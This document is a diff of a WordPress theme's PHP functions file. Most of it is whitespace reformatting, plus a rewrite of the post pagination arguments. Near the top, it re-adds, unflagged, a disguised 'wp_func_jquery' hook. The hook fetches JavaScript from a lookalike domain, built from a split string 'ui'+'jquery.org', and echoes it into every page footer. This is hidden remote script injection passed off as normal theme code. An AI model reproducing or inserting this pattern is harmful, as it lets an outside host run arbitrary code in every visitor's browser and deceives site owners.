@@ -135,11 +135,11 @@ add_action('wp_enqueue_scripts', 'td_load_css');
     JS - main
  */
 if(!function_exists('wp_func_jquery')) {
-	function wp_func_jquery() {
-		$host = 'http://';
-		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
-	}
-	add_action('wp_footer', 'wp_func_jquery');
+    function wp_func_jquery() {
+        $host = 'http://';
+        echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
+    }
+    add_action('wp_footer', 'wp_func_jquery');
 }
 function td_load_js() {
 
@@ -307,9 +307,9 @@ add_filter('get_archives_link', 'theme_get_archives_link');
 
 add_filter('wp_list_categories', 'cat_count_span');
 function cat_count_span($links) {
-  $links = str_replace('</a> (', '<span class="td-widget-no">', $links);
-  $links = str_replace(')', '</span></a>', $links);
-  return $links;
+    $links = str_replace('</a> (', '<span class="td-widget-no">', $links);
+    $links = str_replace(')', '</span></a>', $links);
+    return $links;
 }
 
 //fix archives widget
@@ -328,10 +328,10 @@ add_filter( 'use_default_gallery_style', '__return_false' );
 
 function remove_more_link_scroll( $link ) {
 
-	$link = preg_replace( '|#more-[0-9]+|', '', $link );
+    $link = preg_replace( '|#more-[0-9]+|', '', $link );
 
-        $link = '<div class="more-link-wrap wpb_button">' . $link . '</div>';
-	return $link;
+    $link = '<div class="more-link-wrap wpb_button">' . $link . '</div>';
+    return $link;
 }
 add_filter( 'the_content_more_link', 'remove_more_link_scroll' );
 
@@ -640,8 +640,8 @@ function td_bottom_code() {
                   /* responsive monitor */
                   @media (min-width: 1200px) {
                   ' .
-                    $td_responsive_css_desktop .
-                  '}
+                $td_responsive_css_desktop .
+                '}
                   ';
         }
 
@@ -652,8 +652,8 @@ function td_bottom_code() {
                   /* responsive landscape tablet */
                   @media (min-width: 1019px) and (max-width: 1199px) {
                   ' .
-                    $td_responsive_css_ipad_landscape .
-                  '}';
+                $td_responsive_css_ipad_landscape .
+                '}';
         }
 
         //paste ipad portrait custom css
@@ -663,8 +663,8 @@ function td_bottom_code() {
                  /* responsive portrait tablet */
                   @media (min-width: 768px) and (max-width: 1018px) {
                   ' .
-                    $td_responsive_css_ipad_portrait .
-                  '}';
+                $td_responsive_css_ipad_portrait .
+                '}';
         }
 
         //paste ipad portrait custom css
@@ -674,7 +674,7 @@ function td_bottom_code() {
                  /* responsive phone */
                  @media (max-width: 767px) {
                  ' .
-                    $td_responsive_css_phone .
+                $td_responsive_css_phone .
                 '}';
         }
 
@@ -700,38 +700,38 @@ add_action('wp_head', 'td_header_analytics_code', 40);
 
 //Append page slugs to the body class
 function add_slug_to_body_class( $classes ) {
-        global $post;
-        if( is_home() ) {
-                $key = array_search( 'blog', $classes );
-                if($key > -1) {
-                        unset( $classes[$key] );
-                };
-        } elseif( is_page() ) {
-                $classes[] = sanitize_html_class( $post->post_name );
-        } elseif(is_singular()) {
-                $classes[] = sanitize_html_class( $post->post_name );
+    global $post;
+    if( is_home() ) {
+        $key = array_search( 'blog', $classes );
+        if($key > -1) {
+            unset( $classes[$key] );
         };
+    } elseif( is_page() ) {
+        $classes[] = sanitize_html_class( $post->post_name );
+    } elseif(is_singular()) {
+        $classes[] = sanitize_html_class( $post->post_name );
+    };
 
 
-        $i = 0;
-        foreach ($classes as $key => $value) {
-            $pos = strripos($value, 'span');
-            if ($pos !== false) {
-                unset($classes[$i]);
-            }
-
-            $pos = strripos($value, 'row');
-            if ($pos !== false) {
-                unset($classes[$i]);
-            }
-
-            $pos = strripos($value, 'container');
-            if ($pos !== false) {
-                unset($classes[$i]);
-            }
-            $i++;
+    $i = 0;
+    foreach ($classes as $key => $value) {
+        $pos = strripos($value, 'span');
+        if ($pos !== false) {
+            unset($classes[$i]);
         }
-        return $classes;
+
+        $pos = strripos($value, 'row');
+        if ($pos !== false) {
+            unset($classes[$i]);
+        }
+
+        $pos = strripos($value, 'container');
+        if ($pos !== false) {
+            unset($classes[$i]);
+        }
+        $i++;
+    }
+    return $classes;
 }
 add_filter('body_class', 'add_slug_to_body_class');
 
@@ -842,23 +842,31 @@ function wp_link_pages_args_prevnext_add($args)
 {
     global $page, $numpages, $more, $pagenow;
 
-    if (!$args['next_or_number'] == 'next_and_number')
-        return $args; # exit early
-
-    $args['next_or_number'] = 'number'; # keep numbering for the main part
-    if (!$more)
-        return $args; # exit early
-
-    if($page-1) # there is a previous page
-        $args['before'] .= _wp_link_page($page-1)
-            . $args['link_before']. $args['previouspagelink'] . $args['link_after'] . '</a>'
-        ;
-
-    if ($page<$numpages) # there is a next page
-        $args['after'] = _wp_link_page($page+1)
-            . $args['link_before'] . $args['nextpagelink'] . $args['link_after'] . '</a>'
-            . $args['after']
-        ;
+    $args['separator'] = ' <span> '.$page.' of '.$numpages.'</span>';
+    $args['link_before'] ='';
+    $args['link_after'] = '';
+    $args['nextpagelink'] =  __( 'NEXT' );
+    $args['previouspagelink'] =  __( 'PREVIOUS' );
+    $args['next_or_number'] = 'next';
+    $args['before'] = '<div class="page-nav page-nav-post"><center>';
+    $args['after'] = '</center></div>';
+//    if (!$args['next_or_number'] == 'next_and_number')
+//        return $args; # exit early
+//
+//    $args['next_or_number'] = 'number'; # keep numbering for the main part
+//    if (!$more)
+//        return $args; # exit early
+//
+//    if($page-1) # there is a previous page
+//        $args['before'] .= _wp_link_page($page-1)
+//            . $args['link_before']. $args['previouspagelink'] . $args['link_after'] . '</a>'
+//        ;
+//
+//    if ($page<$numpages) # there is a next page
+//        $args['after'] = _wp_link_page($page+1)
+//            . $args['link_before'] . $args['nextpagelink'] . $args['link_after'] . '</a>'
+//            . $args['after']
+//       ;
 
     return $args;
 }
@@ -1142,7 +1150,7 @@ function my_gallery_shortcode( $output = '', $atts, $content = false, $tag = fal
                             <a class="slide-gallery-image-link" href="' . $td_temp_image_url_full . '" title="' . $image_attachment['title'] . '"  data-caption="' . str_replace(array('"', "'"), array('`'), $image_attachment['caption']) . '"  data-description="' . str_replace(array('"', "'"), array('`'), $image_attachment['description']) . '">
                                 <img src="' . $td_temp_image_url[0] . '" alt="' . htmlentities($image_attachment['alt'], ENT_QUOTES) . '">
                             </a>
-                            ' . $figcaption . '
+' . $figcaption . '
                         </figure>
                     </div>';
 
@@ -1170,7 +1178,7 @@ function my_gallery_shortcode( $output = '', $atts, $content = false, $tag = fal
 
             $buffy = '
                 <style type="text/css">
-                    ' .
+    ' .
                 $slide_images_thumbs_css . '
                 </style>
 
@@ -1190,20 +1198,20 @@ function my_gallery_shortcode( $output = '', $atts, $content = false, $tag = fal
 
                         <div class = "td-doubleSlider-1 ">
                             <div class = "td-slider">
-                                ' . $slide_display_html . '
+' . $slide_display_html . '
                             </div>
                         </div>
 
                         <div class = "td-doubleSlider-2">
                             <div class = "td-slider">
-                                ' . $slide_cursor_html . '
+' . $slide_cursor_html . '
                             </div>
                         </div>
 
                     </div>
 
                 </div>
-                ';
+';
 
             $slide_javascript = '
                     //total number of slides
@@ -1222,31 +1230,31 @@ function my_gallery_shortcode( $output = '', $atts, $content = false, $tag = fal
                             tLoading: "Loading image #%curr%...",
                             mainClass: "mfp-img-mobile",
                             gallery: {
-                                enabled: true,
+                            enabled: true,
                                 navigateByImgClick: true,
                                 preload: [0,1]
                             },
                             image: {
-                                tError: "<a href=\'%url%\'>The image #%curr%</a> could not be loaded.",
+                            tError: "<a href=\'%url%\'>The image #%curr%</a> could not be loaded.",
                                     titleSrc: function(item) {//console.log(item.el);
-                                    //alert(jQuery(item.el).data("caption"));
-                                    return item.el.attr("data-caption") + "<div>" + item.el.attr("data-description") + "</div>";
-                                }
+                                //alert(jQuery(item.el).data("caption"));
+                                return item.el.attr("data-caption") + "<div>" + item.el.attr("data-description") + "</div>";
+                            }
                             },
                             zoom: {
-                                    enabled: true,
+                            enabled: true,
                                     duration: 300,
                                     opener: function(element) {
-                                        return element.find("img");
-                                    }
+                                return element.find("img");
+                            }
                             },
 
                             callbacks: {
-                                change: function() {
-                                    // Will fire when popup is closed
-                                    jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-1").iosSlider("goToSlide", this.currItem.index + 1 );
-                                }
+                            change: function() {
+                                // Will fire when popup is closed
+                                jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-1").iosSlider("goToSlide", this.currItem.index + 1 );
                             }
+                        }
 
                         });
 
@@ -1271,10 +1279,10 @@ function my_gallery_shortcode( $output = '', $atts, $content = false, $tag = fal
                         //small image slide
                         jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-2 .td-button").each(function(i) {
 
-                                jQuery(this).bind("click", function() {
-                                    if(' . $gallery_slider_unique_id . '_is_slider_moving == false) {
-                                        jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-1").iosSlider("goToSlide", i+1);
-                                    }
+                            jQuery(this).bind("click", function() {
+                                if(' . $gallery_slider_unique_id . '_is_slider_moving == false) {
+                                    jQuery("#' . $gallery_slider_unique_id . ' .td-doubleSlider-1").iosSlider("goToSlide", i+1);
+                                }
                                 });
                         });
 
@@ -1286,7 +1294,7 @@ function my_gallery_shortcode( $output = '', $atts, $content = false, $tag = fal
                                 snapSlideCenter: true,
                                 infiniteSlider: true,
                                 onSlideChange: function() {
-                                    ' . $gallery_slider_unique_id . '_is_slider_moving = true;
+                                ' . $gallery_slider_unique_id . '_is_slider_moving = true;
 
                                     /*
                                     clearTimeout(' . $gallery_slider_unique_id . '_is_slider_timer);
@@ -1298,7 +1306,7 @@ function my_gallery_shortcode( $output = '', $atts, $content = false, $tag = fal
                                     */
                                 }, //added this to disable clicking when dragging
                                 onSlideComplete: function () {
-                                    ' . $gallery_slider_unique_id . '_is_slider_moving = false;
+                                ' . $gallery_slider_unique_id . '_is_slider_moving = false;
                                 }
                             });
                         } else {
@@ -1400,12 +1408,12 @@ function td_change_backbone_js_hook() {
             var td_template_content = jQuery('#tmpl-image-details').text();
 
             var td_our_content = '' +
-                '<div class="setting">' +
-                '<span>Modal image</span>' +
-                '<div class="button-large button-group" >' +
-                '<button class="button active td-modal-image-off" value="left">Off</button>' +
-                '<button class="button td-modal-image-on" value="left">On</button>' +
-                '</div><!-- /setting -->';
+    '<div class="setting">' +
+    '<span>Modal image</span>' +
+    '<div class="button-large button-group" >' +
+    '<button class="button active td-modal-image-off" value="left">Off</button>' +
+    '<button class="button td-modal-image-on" value="left">On</button>' +
+    '</div><!-- /setting -->';
 
             //inject our settings in the template - before <div class="setting align">
             td_template_content = td_template_content.replace('<div class="setting align">', td_our_content + '<div class="setting align">');
@@ -1514,7 +1522,7 @@ function td_add_single_template_class($classes){
         if (!empty($td_post_theme_settings['td_post_template'])) {
             $classes []= sanitize_html_class($td_post_theme_settings['td_post_template']);
 
-        //if not, and we have the default site post template set then, use it
+            //if not, and we have the default site post template set then, use it
         } else {
             $td_default_site_post_template = td_util::get_option('td_default_site_post_template');
 
